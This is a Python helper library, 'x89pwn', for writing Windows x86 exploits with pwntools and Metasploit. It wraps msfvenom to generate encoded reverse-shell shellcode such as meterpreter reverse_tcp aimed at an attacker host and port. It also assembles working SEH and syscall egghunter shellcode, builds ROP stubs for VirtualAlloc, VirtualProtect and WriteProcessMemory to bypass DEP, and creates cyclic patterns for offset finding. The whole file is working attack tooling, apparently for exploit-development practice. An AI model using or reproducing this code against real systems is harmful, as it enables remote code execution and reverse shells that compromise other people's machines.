#!/usr/bin/python3
import subprocess
import os
import pwn

######################################################################################################
#
# x89pwn
# pwning helper functions from x89cyber
#
######################################################################################################

def is_port_connected(port):
    '''
    Determine if the port is in "ESTABLISHED" state using netstat.
    '''
    try:
        netstat_output = subprocess.check_output(["netstat", "-an"], universal_newlines=True) #run netstat
        netstat_lines = netstat_output.split('\n') #split the output lines
        #check if any line contains the port in the ESTABLISHED state
        for line in netstat_lines:
            if f":{port}" in line and "ESTABLISHED" in line:
                return True
        return False
    except subprocess.CalledProcessError:
        print("Error executing netstat command.")
        return False
    
def bytes_to_escaped_str(bytestring):
    """
    Convert a bytestring to an escaped string with the byte code representation for printable
    and non-printable chars.  Ex. "\x0a\x10\x00\xff"
    """
    escaped_str = ''.join(f'\\x{byte:02x}' for byte in bytestring)
    return escaped_str

def xformatbytes(raw_bytes):
    """
    Format bytes.    
    """
    s = ''
    cnt = 0
    for b in raw_bytes:
        h = format(b, '02x') #format byte as two digit hex
        s += "\\x" + h   #prepend \x 
        cnt+= 1
    print(f'byte code is {cnt} bytes long')
    return s

def msf_pattern_create(length):
    '''
    Create a non-repeatable pattern with metaploit msf-pattern_create and return as a byte string.
    
    Requirements:
    metasploit must be installed and in the path.
    
    Attributes:
    length: length of the pattern to create.
    '''
    try:
        # Assuming msf-pattern_create is in your PATH
        result = subprocess.run(['msf-pattern_create', '-l', str(length)], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip().encode()  # Returns the pattern generated by msf-pattern_create
        else:
            return "Error: " + result.stderr
    except Exception as e:
        return "An exception occurred: " + str(e)

def msf_generate_shellcode(payload, lhost, lport, b=None, e="x86/shikata_ga_nai", x="process", force=True):
    """
    Generate shellcode using msfvenom with dynamic arguments.

    Requirements:
    metasploit must be installed and in the path.

    Attributes:
    payload: The payload to use (e.g., 'windows/meterpreter/reverse_tcp').
    lhost: The LHOST value (attacker IP).
    lport: The LPORT value (listening port).
    b: bytestring of badchars; syntax is b'\\x00\\x0a\\x0d'. Default is None (no encoding).
    e: The '-e' argument, encoding used for the shellcode.  Default is 'x86/shikata_ga_nai'. 
    x: exit function: process, thread, seh, none
    force: force the shellcode generation - if False read from the cache if it exists
    return: The generated shellcode as a bytestring, or throw an exception.
    """
    try:
        cache_file = 'msf_generate_shellcode.cache'
        cache_exists = os.path.exists(cache_file)
                
        if (force or not cache_exists):
            #construct the msfvenom command
            cmd = [
                "msfvenom",
                "-p", payload,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                f"EXITFUNC={x}",
                "-f", "hex",
                "-o", "/dev/stdout"  # Direct output to stdout for capturing
            ]
            
            if (b != None):
              bstr = bytes_to_escaped_str(b) # repr(b.decode('utf-8')).strip("'") #convert badchar bytes to string with escapes
              cmd.append("-e")
              cmd.append(e)
              cmd.append("-b")
              cmd.append(bstr)
             
            shellcode = subprocess.run(cmd, capture_output=True, text=True, check=True).stdout #execute the command and capture the output
            #cache the result
            with open(cache_file, 'w') as file:
                file.write(shellcode)           
        else: #read from cache
            with open(cache_file, 'r') as file:
                shellcode = file.read()
        return bytes.fromhex(shellcode)
        
    except subprocess.CalledProcessError as e:
        raise subprocess.CalledProcessError("x89pwn.msf_generate_shellcode") from e        
        
def all_chars(bad_chars, start=0x01):
    '''
    Return a bytestring of all characters excluding those in the bad_chars list.
    
    Attributes:
    bad_chars: bytes to exclude in hex format, ex. b'\x00\x0a'
    start: byte to start at - defaults to 0x01
    '''
    all = b''

    for i in range(start,0x100): 
        b = i.to_bytes(1, 'little')
        if (b not in bad_chars):
            all += b
    return all

def egghunter_x86_seh(egg=b"w00t"):
  """
  Return an x86 egghunter shellcode that implements it's own exception handler.
  
  Attributes:
  egg: the 4 byte string to search for twice.  Default is "w00t" and search for "w00tw00t".
  """
  x86asm = f"""
    start:
	    jmp get_seh_address;                 /* jump to a negative call to dynamically obtain egghunter position */
    build_exception_record:                
      pop ecx;                             /* pop the address of the exception_handler into ecx */
      mov eax, {"0x" + egg[::-1].hex()};   /* reverse egg string and format as a hex number: 0xaabbccdd; load to eax */
      push ecx;                            /* push handler of _EXCEPTION_REGISTRATION_RECORD structure */
      push 0xffffffff;                     /* push next of _EXCEPTION_REGISTRATION_RECORD structure */
      xor ebx, ebx;                        /* null out ebx */
      mov dword ptr fs:[ebx], esp;         /* overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure */
      sub ecx, 0x04;                       /* subtract 0x04 from the pointer to exception handler */
      add ebx, 0x04;                       /* add 0x04 to ebx - the index of the StackBase value in TEB */
      mov dword ptr fs:[ebx], ecx          /* overwrite the StackBase in the TEB */
    is_egg:
      push 0x02;                           /* push 0x02 as the counter for repe */
      pop ecx;                             /* pop 0x02 into ecx */
      mov edi, ebx;                        /* move memory address into edi */
      repe scasd;                          /* check for our signature, if the page is invalid we trigger an exception and jump to our exception_handler function */
      jnz loop_inc_one;                    /* if signature not found increase ebx and repeat */
      jmp edi;                             /* if siganature is found jump to the buffer */
    loop_inc_page:
      or bx, 0xfff;                        /* if page is invalid the exception_handler will update eip to point here and we move to next page */
    loop_inc_one:
      inc ebx;                             /* move to the next memory address to search */
      jmp is_egg;                          /* check for egg */ 
    get_seh_address:
      call build_exception_record;         /* call to a higher address to avoid null bytes and push return to obtain egghunter position */
      push 0x0c;                           /* push 0x0c on stack - the offset to the CONTEXT structure pointer (3rd argument) */
      pop ecx;                             /* pop into ecx */
      mov eax, [esp+ecx];                  /* move into eax the pointer to the CONTEXT structure for the exception */
      mov cl, 0xb8;                        /* mov 0xb8 into ecx - the offset to the eip register value at the time of exception, in the CONTEXT structure */
      add dword ptr ds:[eax+ecx], 0x06;    /* increase the value of eip 0x06 in our CONTEXT so it points to the loop_inc_page instruction to increment memory page */
      pop eax;                             /* save return value into eax - this is the return from the ExceptionHandler function */ 
      add esp, 0x10;                       /* increase esp to clean the stack for our call */
      push eax;                            /* push return back on stack */
      xor eax, eax;                        /* null eax to simulate ExceptionContinueExecution (exception handled) return */
      ret;                                 /* return */
  """
  return pwn.asm(x86asm)

def egghunter_x86_syscall(syscall, egg=b"w00t"):
  """
  Return the x86 NtAccessCheckAndAuditAlarm system call egghunter shellcode based on original Matt Miller exploit.  
  
  Note: The system call number is pased to the syscall variable. This varies by version of windows after windows 7. Lookup 
        the syscall number in WinDbg with this call:  u ntdll!NtAccessCheckAndAuditAlarm, and look for the value moved to eax.

  Attributes:
  syscall: Windows x86 system call number for NtAccessCheckAndAuditAlarm.  Pass this is a hex value, ex. 0x1c8.
  egg: the 4 byte egg to search for twice.  Default is "w00t" and search is for "w00tw00t".
  """
  x86asm = f"""
    loop_inc_page:                                 /* use edx as the memory counter page */
      or dx, 0x0fff;                               /* go to the last address in the memory page */
    loop_inc_one: 
      inc edx;                                     /* increment memory counter by one */
    loop_check:
      push edx;                                    /* save edx register which holds memory address on the stack */
      mov eax, { hex((-1*syscall) & 0xFFFFFFFF) }; /* move negative syscall number to eax - use negative hex value to avoid nulls */
      neg eax;                                     /* convert to positive hex value */
      int 0x2e;                                    /* perform the system call */
      cmp al,05;                                   /* check for access violation, 0xc0000005 (ACCESS_VIOLATION) */
      pop edx;                                     /* restore edx register to memory address */
    loop_check_valid:
      je loop_inc_page;                            /* if access violation encountered go to next page */
    is_egg:
      mov eax, { "0x" + egg[::-1].hex() };         /* reverse egg string and format as a hex number: 0xaabbccdd; load to eax */
      mov edi, edx;                                /* initializes edi to current address to check */
      scasd;                                       /* compare eax with dword at edi and set status flags */
      jnz loop_inc_one;                            /* no match - jump to top and increase to next memory location */
      scasd;                                       /* first part of egg detected - check for second part */
      jnz loop_inc_one;                            /* no match - jump to top and increase to next memory location */
    matched:                                       /* edi register points to first byte of our buffer - jump to it */
      jmp edi; """       
  return pwn.asm(x86asm)

def rop_stub_VirtualAlloc(va_addr=0x60606060,rtrn_addr=0x61616161,lpAddress=0x62626262,dwSize=0x63636363,flAllocationType=0x64646464,flProtect=0x65656565):
  """
  Return the VirtualAlloc API stub for DEP bypass using ROP.

  Attributes:
  va_addr: VirtualAllocation address 
  rtrn_addr: return address - start address of shellcode
  lpAddress: start address of shellcode
  dwSize: a value from 0x01-0x999 
  flAllocationType: 0x1000 to commit the change 
  flProtect: 0x40 for read,write,execute
  """
  stub = (  
    pwn.p32(va_addr)   +  # VirtualAllocation address  
    pwn.p32(rtrn_addr) +  # return address - this will get changed to the address of our shellcode  
    pwn.p32(lpAddress) +  # lpAddress - this will get changed to the address of our shellcode  
    pwn.p32(dwSize)    +  # dwSize - this get changed to a value from 0x01-0x999  
    pwn.p32(flAllocationType) +  # flAllocationType - this get changed to 0x1000 to commit the change  
    pwn.p32(flProtect)    # flProtect - this will get changed to 0x40  
  )
  return stub

def rop_stub_VirtualAllocEx():
  """
  Return the VirtualAllocEx API stub for DEP bypass using ROP.
  """
  stub = (  
    pwn.p32(0x60606060) +  # VirtualAllocation address  
    pwn.p32(0x61616161) +  # return address - this will get changed to the address of our shellcode  
    pwn.p32(0x62626262) +  # hProcess - this is the process handle to change memory of
    pwn.p32(0x63636363) +  # lpAddress - this will get changed to the address of our shellcode  
    pwn.p32(0x64646464) +  # dwSize - this get changed to a value from 0x01-0x999  
    pwn.p32(0x65656565) +  # flAllocationType - this get changed to 0x1000 to commit the change  
    pwn.p32(0x66666666)    # flProtect - this will get changed to 0x40  
  )
  return stub

def rop_stub_VirtualProtect(vp_addr=0x60606060, lpAddress=0x61616161, dwSize=0xffffffff, flNewProtect=0xffffffc0, lpflOldProtect=0x65656565):
  """
  Return the VirtualProtect API stub for DEP bypass using ROP.  

  Attributes:
  vp_addr = VirtualProtect address
  lbAddress = ShellCode address
  dwSize = default to -0x01
  flNewProtect = default to -0x40
  lpflOldProtect = DWORD pointer to writable memory
  """
  stub = (  
    pwn.p32(vp_addr)      +  # VirtualProtect address  
    pwn.p32(lpAddress)    +  # return address - this will get changed to the address of our shellcode  
    pwn.p32(lpAddress)    +  # lpAddress - this will get changed to the address of our shellcode  
    pwn.p32(dwSize)       +  # dwSize - this get changed to a value from 0x01-0x999; default to -0x01  
    pwn.p32(flNewProtect) +  # flNewProtect - this get changed to 0x40 for PAGE_EXECUTE_READWRITE; default to -0x40  
    pwn.p32(lpflOldProtect)  # lpflOldProtect - this is a DWORD pointer to a writable location  
  )
  return stub

def rop_stub_WriteProcessMemory(wpm_addr, code_cave_addr, dword_addr):
  """
  Return the WriteProcessMemory API stub for DEP bypass using ROP.

  Attributes:
  wpm_addr = address of WriteProcessMemory function
  code_cave_addr = address of the code cave to write shellcode to
  dword_addr = address of a location the number of bytes written can be written to
  """
  stub = (  
    pwn.p32(wpm_addr)       +  # WriteProcessMemory address  
    pwn.p32(code_cave_addr) +  # return address - address to write our shellcode to in the code cave
    pwn.p32(0xffffffff)     +  # hProcess - assigned after the API is called
    pwn.p32(code_cave_addr) +  # lpBaseAddress - address to write our shellcode to in the code cave
    pwn.p32(0x61616161)     +  # lpBuffer - this will get changed to the address of our shellcode on the stack
    pwn.p32(0x62626262)     +  # nSize - size of our shellcode to copy from the stack  
    pwn.p32(dword_addr)        # *lpNumberOfBytesWritten - memory location to write DWORD value      
  )
  return stub

